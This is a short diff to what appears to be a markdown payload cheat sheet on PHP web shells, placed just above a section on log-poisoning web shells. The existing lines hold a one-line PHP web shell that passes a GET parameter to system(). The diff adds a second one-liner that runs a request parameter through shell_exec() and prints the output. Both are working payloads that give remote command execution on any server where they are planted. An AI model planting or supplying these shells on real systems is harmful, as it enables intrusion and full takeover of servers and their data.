@@ -121,6 +121,10 @@
   <?php system($_GET['cmd']); ?>
   ```
   
+  ```php
+  <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
+  ```
+  
   ---
   
   ### Log Poisoning WebShell
